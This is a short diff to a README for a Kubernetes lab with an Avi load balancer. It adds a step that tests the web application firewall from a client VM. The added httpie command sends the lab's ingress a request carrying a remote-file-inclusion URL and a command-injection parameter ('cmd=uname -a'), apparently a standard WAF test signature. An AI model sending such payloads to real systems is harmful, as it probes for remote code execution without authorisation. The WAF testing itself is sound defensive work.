@@ -279,3 +279,8 @@ $(terraform output -json | jq -r .Destroy_command_avi_config_only.value) ; terra
     ```
   - This triggers a WAF policy which will be attached to the child VS in the Avi controller:
     ![Alt text](img/waf-secure-ingress.png?raw=true "Add WAF policy to your secure ingress")
+- WAF testing from the client vm
+  - A file in the client, as well as on the k8s master called waftest.txt is copied. Append this to your httpie command and check the WAF on Avi Controller
+    ```shell
+    http --verify=no "https://secure-ingress.cluster1.avi.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a"
+    ```
